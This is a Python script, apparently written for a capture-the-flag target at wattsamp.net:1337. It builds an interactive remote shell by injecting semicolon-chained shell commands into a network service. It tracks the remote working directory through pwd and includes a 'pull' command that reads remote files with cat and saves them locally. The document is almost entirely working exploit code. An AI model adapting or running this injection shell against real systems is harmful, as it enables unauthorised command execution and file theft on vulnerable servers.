import time
import re
import socket

host = "wattsamp.net" # IP address here
port = 1337 # Port here

def execute_cmd(cmd, curloc):

	# Connect to the server
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	s.connect((host, port))

	# Recieve ping request
	s.recv(4096).decode("utf-8")

	req = ";cd " + curloc # Get to current directory location
	req += ";" + cmd      # Pass in <Command>
	req += ";pwd\n"       # Get updated directory location

	# Send the request
	time.sleep(.1)
	s.send(req.encode("utf-8"))

	# Recieve any output
	time.sleep(.1)
	outraw = s.recv(4096).decode("utf-8")
	
	# If no output, add a '\n' so that RegEx works.
	# Some commands (cd ...) need to still be updated even though they dont return anything. 
	if not re.match('^(.*)\\n(.*)\\n$', outraw, flags=16):
		outraw = "\n" + outraw
		
	# Split raw output into output from <Command> and output from pwd to get location 
	out = re.match('^(.*)\\n(.*)\\n$', outraw, flags=16).group(1)
	cwd = re.match('^(.*)\\n(.*)\\n$', outraw, flags=16).group(2)

	# Return both
	return (out, cwd)
 

if __name__ == '__main__':
	curloc = "/"
	print("\n\t\t||Shell into wattsamp.net:1337||\n")
	time.sleep(1)

	# Always runs. Can be stopped with 'quit'
	# By design, you are already in the shell and can run any commands in addition to ones you would want to run on the server.
	while True:
		out = ""
		inp = input(curloc+"> ")

		# Help command
		if inp == "help":
			out += "\n"
			out += "<Command>                         :  Run <Command> in the Shell\n"
			out += "pull <remote-path> <local-path>   :  Download files from Shell\n"
			out += "help                              :  Shows this help menu\n"
			out += "?                                 :  Shows help menu in Shell\n"
			out += "quit                              :  Quit the shell\n"

		# Quit command
		elif inp == "quit":
			print("Quitting...\n")
			time.sleep(1)
			exit()

		# Pull command
		elif re.match('^pull (.*) (.*)$', inp):
			# Seperate out arguments
			arg1 = re.match('^pull (.*) (.*)$', inp).group(1)
			arg2 = re.match('^pull (.*) (.*)$', inp).group(2)

			# Get data from remote path
			# If file doesnt exits, nothing is returned
			inp = "cat " + arg1
			(out, curloc) = execute_cmd(inp, curloc)

			try:
				# Create new file at local path
				f = open(arg2, "w+")

				# Write data
				f.write(out)

				f.close()
				out = "File pulled Successfully!"
			except:
				out = "Error pulling file."

		# Anything else should be run on the server thought the Shell as a command.
		else:
			if inp == "?":
				inp = "help"
			(out, curloc) = execute_cmd(inp, curloc)

		# Prints results from any commands given.
		# Some commands and malformed commands will return with just '\n'.
		print(out)